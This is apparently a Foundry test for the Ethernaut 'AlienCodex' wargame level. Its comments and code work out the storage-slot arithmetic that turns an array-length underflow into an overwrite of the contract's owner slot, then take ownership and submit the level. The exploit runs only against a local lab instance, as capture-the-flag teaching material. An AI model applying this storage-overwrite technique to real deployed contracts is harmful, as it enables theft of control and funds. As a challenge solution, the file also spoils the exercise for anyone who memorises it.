// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/19-AlienCodex/AlienCodexFactory.sol";
import "../src/Ethernaut.sol";

contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testAlienCodexHack() public {
        // Level setup
        AlienCodexFactory alienCodexFactory = new AlienCodexFactory();
        ethernaut.registerLevel(alienCodexFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(alienCodexFactory);
        IAlienCodex ethernautAlienCodex = IAlienCodex(payable(levelAddress));

        // Level attack
        // --- AlienCodex storage:
        // Slot[0] - owner + contact
        // Slot[1] - codex.length
        // Slot[2] - empty
        // ...
        // Slot[keccak256(1)]     - codex[0]
        // Slot[keccak256(1) + 1] - codex[1]
        // Slot[keccak256(1) + 2] - codex[2]
        // ...
        // --- 
        // codex.length--;  -->> in solidity 0.5, this means length can be 2^256 - 1 --> we can change data in all slots
        // Slot[2^256 - 1] - codex[2^256 - 1 - keccak256(1)]
        // Slot[0] = Slot[2^256 - 1 + 1] - codex[2^256 - 1 - keccak256(1) + 1] = codex[2^256 - keccak256(1)]
        
        ethernautAlienCodex.make_contact();
        ethernautAlienCodex.retract();  // length = 2^256 - 1
        uint index = (2**256 - 1) - uint(keccak256(abi.encode(1))) + 1;
        ethernautAlienCodex.revise(index, bytes32(abi.encode(eoaAddress)));
        emit log_named_address("Owner", ethernautAlienCodex.owner());
        emit log_named_address("Owner", eoaAddress);

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}